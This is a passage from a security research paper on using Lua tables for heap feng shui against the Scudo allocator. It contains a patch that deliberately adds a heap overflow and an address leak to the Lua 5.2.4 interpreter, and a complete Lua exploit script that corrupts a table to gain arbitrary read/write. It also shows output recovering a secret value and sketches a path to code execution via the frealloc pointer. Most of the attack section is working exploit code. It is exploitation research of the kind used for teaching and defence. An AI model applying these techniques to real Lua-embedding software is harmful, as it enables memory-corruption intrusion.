+this access of the table data is very likely to hit some memory that we
+cannot access and cause our target to crash. Annoying to say the least.
+
+Given that we have to access the table data anyway to determine its size,
+why don't *we* access the data instead, and determine whether the table has
+been corrupted based on what we find. It turns out there is an easy and
+reliable way to do this. If we access an index that is outside the bounds
+of the table (e.g., the fifth element of a table with only four elements),
+Lua simply returns `nil`. We can leverage this behavior by ensuring that
+all of our potential victim tables have a known size. For example, we could
+do something like this:
+
+```lua
+victims = {}
+for c=1,NUM_VICTIM_TABLES do
+  t = {1,2,3,4}
+  victims[c] = t
+end
+```
+
+Then, after the memory corruption has occurred, we can do something like
+this to find the corrupted table:
+```lua
+corrupted = nil
+for c=1,NUM_VICTIM_TABLES do
+  if victims[c][5] ~= nil then
+    corrupted = victims[c]
+  end
+end
+```
+
+Assuming we have corrupted only one table, there should now be only one
+time where `victims[c][5]` is not `nil`, and that is in our corrupted
+table. Note that we need to be careful which index in our table we choose
+to check against the value `nil`. If `victims[c][5]` happens to have the
+value `nil`, for example due to memory being zero-initialized, then we will
+have a false negative and will be unable to find our corrupted table. One
+way around this is to keep in mind which Scudo region our table data gets
+allocated in. Then, we can pick an index such that the data we read is
+likely to line up with a Scudo chunk header or other table data, giving us
+a high probability that we won't accidentally read a `nil` value.
+
+--[ PoC or GTFO
+
+Now that we've got all of the theory out of the way, I can finally
+demonstrate a somewhat practical example. Of course, before I get started,
+I'll need some kind of heap corruption bug. For the sake of absolute
+simplicity, I'll just take the standard Lua 5.2.4 interpreter and introduce
+my own bug. Contrived, I know, but it will allow me to keep things simple
+and really focus on the technique. While I'm at it, I can also add a
+"secret" value with the objective of giving us something to do with our
+read/write primitive.
+
+If you want to create your vulnerable version of Lua, simply apply the
+following patch file:
+
+```diff
+--- ./lua-5.2.4/src/lua.c	2025-11-14 19:31:33.360806429 +0000
++++ ./vuln-lua/src/lua.c	2025-11-16 20:28:03.737247360 +0000
+@@ -89,6 +89,7 @@
+
+ static const char *progname = LUA_PROGNAME;
+
++static int SECRET = 0xcafef00d;
+
+
+ static void lstop (lua_State *L, lua_Debug *ar) {
+@@ -435,6 +436,82 @@
+ }
+
+
++static int randomize_heap_state(lua_State *L) {
++  unsigned char buf[32];
++  unsigned int seed;
++  size_t nread;
++  FILE *f;
++  int r;
++  int ii;
++
++  f = NULL;
++  f = fopen("/dev/random", "r");
++  if (!f)
++    goto cleanup;
++
++  nread = fread(buf, 1, 32, f);
++  if (nread != 32) {
++    l_message(progname, "Could not seed PRNG!\n");
++    goto cleanup;
++  }
++
++  /* Dirty but works */
++  seed = *(unsigned int*)(buf);
++  srand(seed);
++
++  /* Generate random number between 1-16 */
++  r = rand();
++  r = (r % 16) + 1;
++
++  /* Leak some memory making sure each allocation */
++  /* is the size of a Table */
++  for (ii = 0; ii < r; ii++) {
++    malloc(0x38);
++  }
++
++  l_message(progname, "Created random number of allocations\n");
++
++cleanup:
++  if (f)
++    fclose(f);
++
++  return 0;
++}
++
++
++static int overflow(lua_State *L) {
++  size_t len;
++  const char *data;
++  char *buf;
++
++  data = luaL_checkstring(L, 1);
++  len = strlen(data);
++
++  /* Make sure our buffer goes next to our Tables */
++  buf = malloc(0x38);
++  if (!buf) {
++    l_message(progname, "Failed to allocate buffer!\n");
++    return 0;
++  }
++
++  memcpy(buf, data, len);
++
++  /* This if statement should never be true */
++  /* It's just needed to avoid optimizing out the bug */
++  if (buf[0] == '\x00') {
++    l_message(progname, "Buffer starts with null byte!\n");
++  }
++
++  return 0;
++}
++
++static int leak_secret_addr(lua_State *L) {
++  char buf[1024];
++  snprintf(buf, 1023, "secret addr: %p\n", &SECRET);
++  lua_pushstring(L, buf);
++  return 1;
++}
++
+ static int pmain (lua_State *L) {
+   int argc = (int)lua_tointeger(L, 1);
+   char **argv = (char **)lua_touserdata(L, 2);
+@@ -457,6 +527,16 @@
+   lua_gc(L, LUA_GCSTOP, 0);  /* stop collector during initialization */
+   luaL_openlibs(L);  /* open libraries */
+   lua_gc(L, LUA_GCRESTART, 0);
++
++  /* register our custom C functions */
++  lua_pushcfunction(L, randomize_heap_state);
++  lua_setglobal(L, "randomize_heap_state");
++  lua_pushcfunction(L, overflow);
++  lua_setglobal(L, "overflow");
++  lua_pushcfunction(L, leak_secret_addr);
++  lua_setglobal(L, "leak_secret_addr");
++
++
+   if (!args[has_E] && handle_luainit(L) != LUA_OK)
+     return 0;  /* error running LUA_INIT */
+   /* execute arguments -e and -l */
+```
+
+I've also added a function to leak the address of the secret value, again
+to make things as simple as possible, and a function to randomize the heap
+state. It won't be used in this example, but may be useful for anyone that
+wants to play around with the technique.
+
+The vulnerability itself is found in the `overflow` function. It's a very
+straightforward, contrived heap buffer overflow with arbitrary data. The
+only constraint is that any null bytes will terminate the input.
+
+Now for the actual exploit code. I've commented the code pretty heavily in
+the hopes that it will be as easy to understand as possible:
+
+```lua
+-- Turn off the garbage collector
+collectgarbage("stop")
+
+-- Left shift
+function lsl(v, s)
+  return v * math.pow(2,s)
+end
+
+-- hex2double
+function hex2double(v)
+  local bytes
+  local S
+  local F
+  local E
+  local ii
+  local jj
+
+  -- Make sure the input is 16 characters
+  while #v < 16 do
+    v = "0" .. v
+  end
+
+  v = string.sub(v, -16)
+
+  ii = 1
+  jj = 1
+  bytes = {0,0,0,0,0,0,0,0}
+  while ii < 16 do
+    bytes[jj] = tonumber(string.sub(v, ii, ii+1), 16)
+    ii = ii + 2
+    jj = jj + 1
+  end
+
+  S = 1
+  if bytes[1] > 0x7f then
+    S = -1
+  end
+
+  bytes[1] = bytes[1] % 0x80
+  E = lsl(bytes[1], 4) + math.floor((bytes[2] - (bytes[2] % 0x10))/16)
+
+  bytes[2] = bytes[2] % 0x10
+  F = lsl(bytes[2],48) + lsl(bytes[3],40) + lsl(bytes[4],32) + lsl(bytes[5],24) + lsl(bytes[6],16) + lsl(bytes[7],8) + bytes[8]
+  F = F/0x10000000000000
+
+  -- Subnormals
+  if E == 0 then
+    return S * math.ldexp(0+F, -1022)
+  else
+    return S * math.ldexp(1+F, E-1023)
+  end
+end
+
+-- Very simple string split function
+function split(s, sep)
+  if sep == nil then
+    sep = "%s"
+  end
+
+  local t = {}
+  for str in string.gmatch(s, "([^"..sep.."]+)") do
+    table.insert(t, str)
+  end
+  return t
+end
+
+-- Extract address from the string representation of a table
+function get_table_addr_str(tbl)
+  local tmp = split(tostring(tbl), " ")
+  tmp = split(tmp[2], "x")
+
+  return tmp[2]
+end
+
+-- Get the address of table as a string of bytes
+-- Optionally, add an offset to the table's address
+function get_table_addr_with_offset(tbl, offset)
+  local addr_string = get_table_addr_str(tbl)
+
+  if #addr_string % 2 ~= 0 then
+    addr_string = "0" .. addr_string
+  end
+
+  local bytes = {}
+  local ii = 1
+  local jj = 1
+  local b
+  while ii < #addr_string+2 do
+    b = string.sub(addr_string, ii, ii+1)
+    bytes[jj] = tonumber(b, 16)
+    jj = jj + 1
+    ii = ii + 2
+  end
+
+  local rem
+  rem = false
+  ii = #bytes
+
+  if bytes[ii] + offset > 0xff then
+    rem = true
+  end
+  bytes[ii] = (bytes[ii] + offset) % 0x100
+  ii = ii -1
+
+  while rem == true and ii > 0 do
+    if bytes[ii] + 1 > 0xff then
+      rem = true
+    else
+      rem = false
+    end
+    bytes[ii] = (bytes[ii] + 1) % 0x100
+
+    ii = ii - 1
+  end
+
+  -- Check for null bytes
+  local found_null = false
+  for ii=#bytes,1,-1 do
+    if bytes[ii] == 0 then
+      found_null = true
+    elseif found_null then
+      print("Address cannot contain null bytes!")
+      return nil
+    end
+  end
+
+  -- Convert the address to a string in little-endian form
+  ret = ""
+  for ii=#bytes,1,-1 do
+    ret = ret .. string.char(bytes[ii])
+  end
+
+  return ret
+end
+
+-- Create a table which we will use for our
+-- arbitrary read/write
+rwtable = {1,2}
+
+-- Get the address of the table's `array` field as a string of bytes
+rwtable_array = get_table_addr_with_offset(rwtable, 0x10)
+
+-- If the table's address contained a null byte
+-- re-allocate the table and try again
+while rwtable_array == nil do
+  rwtable = {1,2}
+  rwtable_array = get_table_addr_with_offset(rwtable, 0x10)
+end
+
+-- Create tables to hold references to our filler tables and victim tables
+-- The number of filler and victim tables needs tuning on a per-target basis
+NUM_FILLER_TABLES = 2730
+NUM_VICTIM_TABLES = 2650
+filler_tables = {}
+victim_tables = {}
+corrupted = nil
+
+-- Useful constants
+three = 1.5e-323
+six = 3e-323
+
+function do_feng_shui()
+  -- Fill the current 256K section
+  for ii=1,NUM_FILLER_TABLES do
+    t = {}
+    filler_tables[ii] = t
+  end
+
+  -- At this point we definitely have a fresh section
+  -- Fill it with victim tables
+  for ii=1,NUM_VICTIM_TABLES do
+    t = {}
+    victim_tables[ii] = t
+  end
+end
+
+function exploit()
+  -- Set up the heap layout
+  do_feng_shui()
+
+  -- Use the overflow to corrupt one of our victim tables
+  buffer = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+  chunk_hdr = "BBBBBBBBBBBBBBBB"
+  nextp = "CCCCCCCC"
+  bytes= "DDDD"
+  sizearray = "EEEE"
+  array = rwtable_array
+
+  if array == nil then
+    print("Unable to exploit! Table array address contained null byte!")
+    return
+  end
+
+  payload = buffer .. chunk_hdr .. nextp .. bytes .. sizearray .. array
+  overflow(payload)
+
+  -- Find the corrupted table
+  corrupted = nil
+
+  -- Check filler tables just in case
+  for ii=1,NUM_FILLER_TABLES do
+    if filler_tables[ii] ~= nil and filler_tables[ii][1] ~= nil then
+      corrupted = filler_tables[ii]
+    end
+  end
+
+  -- Check victim tables
+  if corrupted == nil then
+    for ii=1,NUM_VICTIM_TABLES do
+      if victim_tables[ii] ~= nil and victim_tables[ii][1] ~= nil then
+        corrupted = victim_tables[ii]
+      end
+    end
+  end
+
+  print("corrupted:")
+  print(corrupted)
+end
+
+while corrupted == nil do
+  exploit()
+end
+
+
+-- Tables for reading data
+rt1 = {1,2}
+rt2 = {1,2}
+
+-- Set up function to write to an arbitrary address
+function write_addr(addr, val)
+  -- Set the `array` pointer of rwtable to desired address using the corrupted table
+  -- Use rwtable to write to the desired address
+  corrupted[1] = addr
+  rwtable[1] = val
+end
+
+-- Write 0x3 into the rt1 table structure so we can read its `array` pointer
+local rt_addr = get_table_addr_str(rt1)
+write_addr(hex2double(rt_addr) + hex2double("18"), three)
+
+-- Read the `array` pointer
+corrupted[1] = hex2double(rt_addr) + hex2double("10")
+local rt_array = rwtable[1]
+
+-- Set up rt2 to point to rt1's array with an offset of 0x8
+local rt2_array = rt_array + hex2double("08")
+local rt2_addr = get_table_addr_str(rt2)
+write_addr(hex2double(rt2_addr) + hex2double("10"), rt2_array)
+
+-- Set up our initial arbitrary read
+function _read_addr(addr)
+  corrupted[1] = addr
+  rt1[1] = rwtable[1]
+  rt2[1] = three
+  return rt1[1]
+end
+
+-- Set up our actual arbitrary read
+function read_closure(addr)
+  -- Use our corrupted table to set the address we want to read from
+  -- and read the value into upval1
+  corrupted[1] = addr
+  local upval1 = rwtable[1]
+
+  -- Closure which simply returns the value of upval1
+  function inner()
+    return upval1
+  end
+
+  return inner
+end
+
+function read_addr(addr)
+  -- Get our closure object
+  inner = read_closure(addr)
+
+  -- Get the address of the closure object in memory
+  -- And get the address of the `upvals` array
+  inner_addr = get_table_addr_str(inner)
+  upvals_addr_addr = hex2double(inner_addr) + hex2double("20")
+
+  -- Get the address of the `TValue` and corrupt its `tt_` field
+  upvals_addr = _read_addr(upvals_addr_addr)
+  upval1_tt_addr = upvals_addr + hex2double("20")
+  write_addr(upval1_tt_addr, three)
+
+  -- Return the value in upval1
+  return inner()
+end
+
+-- Leak the address of SECRET
+secret_addr_str = string.gsub(leak_secret_addr(), "%c", "")
+secret_addr = hex2double(split(secret_addr_str, "x")[2])
+
+-- Read the value of SECRET
+secret_value = read_addr(secret_addr)
+print(split(split(string.format("%.13a", secret_value), ".")[2],"p")[1])
+```
+
+There is a lot of stuff here, so let's take it from the top. First, the
+garbage collector is turned off to prevent it from messing with things
+while the exploit is running. Then, some utility functions are defined,
+with the main ones being `hex2double`, which we've already seen, and
+`get_table_addr_with_offset`, which takes a table as its input and returns
+a byte string containing the table's address. An offset value can also be
+supplied to be added to the table's address before the byte string is
+returned.
+
+Next, some tables needed for later are set up, along with some constants
+which will be used while manipulating the heap. The function `do_feng_shui`
+is responsible for performing the technique from earlier, allocating tables
+to fill up the mapped portion of a Scudo region. The `exploit` function
+ties everything together and finds the corrupted table. Note that in this
+exploit both the `sizearray` and `array` fields of the victim table are
+corrupted.
+
+Once the corrupted table is found, it is used to set up the read and write
+primitives required to read the secret value from the modified Lua
+interpreter.
+
+Of course, the exploit code presented above is by no means polished, and
+it's certainly not indicative of something that would be ready to go into a
+fully-fledged, polished exploit. Nevertheless, it works for our purposes
+here as a demonstration of the core concepts.
+
+Running this exploit against the modified Lua interpreter, we finally get
+the following payoff:
+
+```
+$ LD_PRELOAD=./libscudo.so ./lua-5.2.4/src/lua ./exploit.lua
+corrupted:
+table: 0x7facd248adb0
+00000cafef00d
+Scudo ERROR: misaligned pointer when deallocating address 0x559300000003
+```
+
+This result was produced on a Debian based 64-bit Linux VM, using the
+standalone version of Scudo compiled directly from the LLVM project's
+GitHub repository (commit hash: 4cd8c113685bcc218490b98b097f7edc61cc7c2b),
+in case you want to have a go at reproducing.
+
+--[ Closing Remarks
+
+This paper has presented a way to leverage Lua and its implementation of
+tables to manipulate heap layout prior to exploitation, and applied this
+technique against the Scudo allocator. My overview of Lua's internals has
+paid particular attention to how some of the design decisions of the
+language present challenges for us when developing exploits, and how these
+challenges can be overcome.
+
+The techniques presented here are generic. Lua can be used to manipulate
+the heap layout with other allocators, though the exact details of *how* to
+manipulate the heap depend on the implementation of the allocator.
+Similarly, the fact that Scudo maps memory into its regions 256KB at a time
+can be leveraged even in the absence of Lua, provided that you have enough
+control over memory allocations.
+
+Hopefully, you've found these techniques interesting, and maybe even
+useful.
+
+--[ Future Work
+
+As I've demonstrated, some of Lua's design decisions, such as representing
+all numeric data as `double`s or the use of the `TValue` struct to
+represent all values, present some unique challenges. I feel like some of
+the methods for overcoming these challenges are somewhat crude and could
+therefore be refined.
+
+Similarly, the feng shui technique presented against Scudo could likely do
+with some improvements. The main problem is that if you can't just make a
+hole by freeing some memory, you need to be pretty accurate in filling up
+the 256KB portions of memory that Scudo maps into the regions. This, in
+turn, makes the technique susceptible to noise, which is not ideal against
+more complex targets where many allocations and deallocations could be
+happening in the background while your exploit code is running.
+Unfortunately, I don't even have a good direction to start here, but I'm
+looking forward to seeing what the community comes up with.
+
+Of course, we didn't cover how to actually achieve code execution once
+you've got your arbitrary read/write primitive. I have actually developed a
+technique for this leveraging Lua itself but unfortunately it didn't quite
+make it into this paper, and it's kind of outside the scope here anyway.
+I'll quickly outline the technique here for the interested reader, but
+implementing it will be left as an exercise ;). Lua keeps all its garbage
+collectible objects in a linked list, and using our arbitrary read
+primitive it's possible to walk this linked list all the way to the top to
+reach the registry table. This table contains a reference to the
+`lua_State` object, which in turn contains a reference to the
+`global_State` object. This object contains a function pointer called
+`frealloc` which we can overwrite using our write primitive. When Lua
+allocates new objects it passes the `ud` member of the `global_State` as
+the first parameter to this function, so by overwriting this member we can
+even control the first parameter. Now, the next time an object is allocated
+by Lua we gain control of execution.
+
+Finally, the last thing to do, and perhaps the most obvious, is to find
+some targets and apply the techniques shown here! As I pointed out in the
+introduction to this paper, Lua is used today in some interesting places,
+and trust me, there are likely to be many more.
+
+--[ References
+
+[1] Heap Feng Shui in JavaScript - Alexander, S.
+    https://www.blackhat.com/presentations/bh-usa-07/Sotirov/Whitepaper/bh-usa-07-sotirov-WP.pdf
+
+[2] Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws -
+    Anonymous
+    https://memorycorruption.net/posts/rce-lua-factorio/
+
+[3] Pwning Lua through 'load' - saelo
+    https://saelo.github.io/posts/pwning-lua-through-load.html
+
+[4] Defeating Lua: Tips for finding vulnerabilities in Lua programming
+    language - Anonymous
+    https://nilarmstrong.github.io/posts/
+
+[5] Video Games Modding Vulnerabilities - Paul, F. Lucien, M.
+    https://github.com/gbip/lua_attack
+
+[6] Exploiting Lua 5.1 on 32-bit Windows - corsix
+    https://gist.github.com/corsix/6575486
+
+[7] sneaky.lua - corsix
+    https://gist.github.com/corsix/49d770c7085e4b75f32939c6c076aad6
+
+[8] redis.lua - benmmurphy
+    https://gist.github.com/benmmurphy/7d609f96deab5e297918bf9a395350e2
+
+[9] Security Advisory: CVE-2025-49844 - Redis Blog
+    https://redis.io/blog/security-advisory-cve-2025-49844/
+
+[10] Qualys CAR Supported Scripting Languages - Qualys Documentation
+    https://docs.qualys.com/en/car/latest/get_started/supported_scripting_languages.htm
+
+[11] SCUDO Hardened Allocator — Unofficial Internals Documentation -
+    BSDaemon
+    https://www.l3harris.com/newsroom/editorial/2023/10/scudo-hardened-allocator-unofficial-internals-documentation
+
+[12] Scudo's Internals - un1fuzz
+    https://un1fuzz.github.io/articles/scudo_internals.html
+
+[13] mediawiki-extensions-Scribunto - Wikimedia
+    https://github.com/wikimedia/mediawiki-extensions-Scribunto/blob/master/includes/Engines/LuaCommon/lualib/mw.text.lua
+
+|=[ EOF ]=---------------------------------------------------------------=|
